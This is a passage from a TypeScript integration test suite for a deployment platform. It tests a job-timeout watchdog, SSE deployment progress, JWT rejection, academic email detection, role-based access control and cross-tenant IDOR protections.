      store.get(r.deployment!.deploymentId)?.status,
      'LIVE',
      `Batch deployment ${r.deployment?.deploymentId} must complete as LIVE`
    );
  }

  // TC-903-02: Timeout Watchdog terminates hung job with BUILD_TIMEOUT & drains next job
  const watchdogQueue = new DeploymentJobQueue({
    maxConcurrency: 1,
    maxQueueBacklog: 10,
    jobTimeoutMs: 120,
  });
  let hungTimedOut = false;
  let secondJobRanAfterTimeout = false;

  watchdogQueue.enqueue({
    payload: {
      deploymentId: 'dep_hung_1',
      cloneUrl: 'https://github.com/example/hung.git',
    },
    onTimeout: () => {
      hungTimedOut = true;
    },
    processor: async () => {
      // Simulate hung build that never resolves within 120ms
      await new Promise((r) => setTimeout(r, 2000));
    },
  });

  watchdogQueue.enqueue({
    payload: {
      deploymentId: 'dep_after_hung_2',
      cloneUrl: 'https://github.com/example/healthy.git',
    },
    processor: async () => {
      secondJobRanAfterTimeout = true;
    },
  });

  await new Promise((r) => setTimeout(r, 260));
  assert.strictEqual(hungTimedOut, true, 'Watchdog must fire onTimeout for hung build');
  assert.strictEqual(
    secondJobRanAfterTimeout,
    true,
    'Worker slot must be released after BUILD_TIMEOUT so queued jobs drain'
  );

  // TC-903-03: Event-driven SSE stream delivers ordered progress events culminating in LIVE
  const sseDeploy = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-sse-app',
    target: 'S3_CLOUDFRONT',
  });
  assert.strictEqual(sseDeploy.ok, true);
  const sseStreamRes = await invokeApp(
    testApp,
    'GET',
    `/api/deploy/${sseDeploy.deployment!.deploymentId}/stream`
  );
  assert.strictEqual(sseStreamRes.status, 200);
  assert.ok(String(sseStreamRes.headers['content-type']).includes('text/event-stream'));
  const sseFrames = sseStreamRes.text
    .split('\n\n')
    .map((chunk) => chunk.trim())
    .filter((chunk) => chunk.startsWith('data: '))
    .map((chunk) => JSON.parse(chunk.slice('data: '.length)) as { deployment: { status: string } });
  assert.ok(sseFrames.length >= 2, 'Expected multiple real-time SSE frames across pipeline phases');
  assert.strictEqual(
    sseFrames[sseFrames.length - 1].deployment.status,
    'LIVE',
    'Final SSE frame must reflect LIVE status'
  );
  console.log('   ✓ DM-903 (TC-903-01, TC-903-02, TC-903-03) passed.');

  // ==========================================================================
  // DM-904 (#4): OAuth / JWT Session Auth & .edu Academic Student Detection
  // ==========================================================================
  console.log('13. Testing DM-904 (JWT Validation, Atomic Workspace Onboarding & .edu Student Detection)...');

  // TC-904-03: Academic email verification rules
  assert.strictEqual(detectAcademicStudentEmail('jane@stanford.edu').studentVerified, true);
  assert.strictEqual(detectAcademicStudentEmail('jane@stanford.edu').academicDomain, 'stanford.edu');
  assert.strictEqual(detectAcademicStudentEmail('researcher@ox.ac.uk').studentVerified, true);
  assert.strictEqual(detectAcademicStudentEmail('student@nus.edu.sg').studentVerified, true);
  assert.strictEqual(detectAcademicStudentEmail('founder@startup.io').studentVerified, false);

  // TC-904-01: Missing, malformed, tampered & expired tokens -> 401 Unauthorized
  const missingAuthRes = await invokeApp(testApp, 'GET', '/api/auth/me');
  assert.strictEqual(missingAuthRes.status, 401);

  const tamperedAuthRes = await invokeApp(testApp, 'GET', '/api/auth/me', {
    headers: { Authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.tampered.signature' },
  });
  assert.strictEqual(tamperedAuthRes.status, 401);

  const expiredToken = authService.signToken(
    {
      sub: sessionOrg1.user.userId,
      email: sessionOrg1.user.email,
      defaultOrgId: org1Id,
    },
    -10
  );
  const expiredAuthRes = await invokeApp(testApp, 'GET', '/api/auth/me', {
    headers: { Authorization: `Bearer ${expiredToken}` },
  });
  assert.strictEqual(expiredAuthRes.status, 401);

  // TC-904-02: First-time OAuth session onboarding via POST /api/auth/session
  const studentLoginRes = await invokeApp(testApp, 'POST', '/api/auth/session', {
    body: {
      email: 'jane@stanford.edu',
      displayName: 'Jane Stanford',
      authProvider: 'github',
    },
  });
  assert.strictEqual(studentLoginRes.status, 200);
  assert.ok(
    String(studentLoginRes.headers['set-cookie'] || '').includes('HttpOnly'),
    'Session cookie must set HttpOnly flag'
  );
  const studentSession = studentLoginRes.json<{
    token: string;
    user: { userId: string; studentVerified: boolean; academicDomain: string };
    defaultOrganization: { orgId: string; planTier: string };
    organizations: Array<{ role: string }>;
  }>();
  assert.strictEqual(studentSession.user.studentVerified, true);
  assert.strictEqual(studentSession.user.academicDomain, 'stanford.edu');
  assert.strictEqual(studentSession.defaultOrganization.planTier, 'CAMPUS_FREE');
  assert.strictEqual(studentSession.organizations[0].role, 'OWNER');

  const meRes = await invokeApp(testApp, 'GET', '/api/auth/me', {
    headers: { Authorization: `Bearer ${studentSession.token}` },
  });
  assert.strictEqual(meRes.status, 200);
  console.log('   ✓ DM-904 (TC-904-01, TC-904-02, TC-904-03) passed.');

  // ==========================================================================
  // DM-905 (#5): Organizations, Projects & RBAC + Cross-Tenant IDOR Security
  // ==========================================================================
  console.log('14. Testing DM-905 (OWNER/ADMIN/DEVELOPER/VIEWER RBAC Matrix & Cross-Tenant IDOR 404)...');

  // 1. OWNER creates Team Org A
  const createOrgARes = await invokeApp(testApp, 'POST', '/api/orgs', {
    headers: { Authorization: `Bearer ${studentSession.token}` },
    body: { name: 'Stanford Robotics Cloud', planTier: 'GROWTH_TEAM' },
  });
  assert.strictEqual(createOrgARes.status, 201);
  const orgAId = createOrgARes.json<{ organization: { orgId: string } }>().organization.orgId;

  // 2. Invite ADMIN, DEVELOPER, and VIEWER into Org A
  for (const member of [
    { email: 'admin@robotics.io', role: 'ADMIN' },
    { email: 'dev@robotics.io', role: 'DEVELOPER' },
    { email: 'viewer@robotics.io', role: 'VIEWER' },
  ]) {
    const invRes = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/members`, {
      headers: { Authorization: `Bearer ${studentSession.token}` },
      body: member,
    });
    assert.strictEqual(invRes.status, 201);
  }

  // Obtain JWTs for ADMIN, DEVELOPER, VIEWER, and an external attacker in Org B
  const adminToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'admin@robotics.io' },
    })
  ).json<{ token: string }>().token;

  const devToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'dev@robotics.io' },
    })
  ).json<{ token: string }>().token;

  const viewerToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'viewer@robotics.io' },
    })
  ).json<{ token: string }>().token;

  const orgBSession = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'outsider@othercompany.com' },
    })
  ).json<{ token: string; defaultOrganization: { orgId: string } }>();

  // TC-905-01a: VIEWER cannot create projects or deploy (403), but CAN read deployments (200)
  const viewerCreateProj = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/projects`, {
    headers: { Authorization: `Bearer ${viewerToken}`, 'X-Org-Id': orgAId },
    body: { name: 'viewer-blocked', repoUrl: 'https://github.com/example/vite-app' },
  });
  assert.strictEqual(viewerCreateProj.status, 403);

  const viewerDeploy = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${viewerToken}`, 'X-Org-Id': orgAId },
    body: { repoUrl: 'https://github.com/example/vite-app', environment: 'preview' },
  });
  assert.strictEqual(viewerDeploy.status, 403);

  const viewerList = await invokeApp(testApp, 'GET', '/api/deployments', {
    headers: { Authorization: `Bearer ${viewerToken}`, 'X-Org-Id': orgAId },
  });
  assert.strictEqual(viewerList.status, 200);

  // TC-905-01b: DEVELOPER CAN create project (201) & deploy to preview (202), CANNOT invite members (403) or deploy to production (403)
  const devInviteBlocked = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/members`, {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: { email: 'friend@robotics.io', role: 'VIEWER' },
  });
  assert.strictEqual(devInviteBlocked.status, 403);

  const devCreateProj = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/projects`, {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: { name: 'Telemetry UI', repoUrl: 'https://github.com/example/vite-app' },
  });
  assert.strictEqual(devCreateProj.status, 201);
  const projectAId = devCreateProj.json<{ project: { projectId: string } }>().project.projectId;

  const devPreviewDeploy = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      projectId: projectAId,
      environment: 'preview',
    },
  });
  assert.strictEqual(devPreviewDeploy.status, 202, 'DEVELOPER must be allowed to deploy preview');

  const devProdBlocked = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      projectId: projectAId,
      environment: 'production',
    },
  });
  assert.strictEqual(devProdBlocked.status, 403, 'DEVELOPER must be blocked from production deploy');

  // TC-905-01c: ADMIN CAN deploy to production (202), while DEVELOPER & VIEWER CANNOT delete production (403)
  const adminProdDeploy = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      projectId: projectAId,
      environment: 'production',
    },
  });
  assert.strictEqual(adminProdDeploy.status, 202, 'ADMIN must be allowed to deploy production');
  const prodDepId = adminProdDeploy.json<{ deploymentId: string }>().deploymentId;

  for (let i = 0; i < 40; i++) {
    if (store.get(prodDepId)?.status === 'LIVE') break;
    await new Promise((r) => setTimeout(r, 150));
  }

  const devDeleteProdBlocked = await invokeApp(
    testApp,
    'DELETE',
    `/api/deploy/${prodDepId}`,
    {
      headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    }
  );
  assert.strictEqual(devDeleteProdBlocked.status, 403, 'DEVELOPER cannot teardown production');

  // TC-905-02: Cross-Tenant IDOR Security Test -> Outsider in Org B gets 404 Not Found on Org A resources
  const idorGetDeploy = await invokeApp(testApp, 'GET', `/api/deploy/${prodDepId}`, {
    headers: {
      Authorization: `Bearer ${orgBSession.token}`,
      'X-Org-Id': orgBSession.defaultOrganization.orgId,
    },
  });
  assert.strictEqual(idorGetDeploy.status, 404, 'Cross-tenant GET /api/deploy/:id must return 404');

  const idorDeleteDeploy = await invokeApp(testApp, 'DELETE', `/api/deploy/${prodDepId}`, {
    headers: {
      Authorization: `Bearer ${orgBSession.token}`,
      'X-Org-Id': orgBSession.defaultOrganization.orgId,
    },
  });
  assert.strictEqual(
    idorDeleteDeploy.status,
    404,
    'Cross-tenant DELETE /api/deploy/:id must return 404 without ID enumeration'
  );

  const idorGetOrg = await invokeApp(testApp, 'GET', `/api/orgs/${orgAId}`, {
    headers: { Authorization: `Bearer ${orgBSession.token}` },
  });
  assert.strictEqual(idorGetOrg.status, 404, 'Cross-tenant GET /api/orgs/:orgId must return 404');

  // Finally, ADMIN tears down Org A production deployment cleanly (200)
  const adminDeleteProd = await invokeApp(testApp, 'DELETE', `/api/deploy/${prodDepId}`, {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
  });
  assert.strictEqual(adminDeleteProd.status, 200);

  if (fs.existsSync(tmpDbPath)) {
    fs.unlinkSync(tmpDbPath);
  }

  console.log('   ✓ DM-905 (TC-905-01 RBAC Matrix & TC-905-02 Cross-Tenant IDOR 404) passed.\n');
  console.log('ALL PHASE 9 · SPRINT 1 TESTS (DM-901, DM-902, DM-903, DM-904, DM-905) PASSED!');
}

async function runAllTests(): Promise<void> {
  await runPhase1To3Tests();
  await runPhase9Sprint1Tests();
}

runAllTests().catch((err) => {
  console.error('Test suite failed:', err);
  process.exit(1);
});
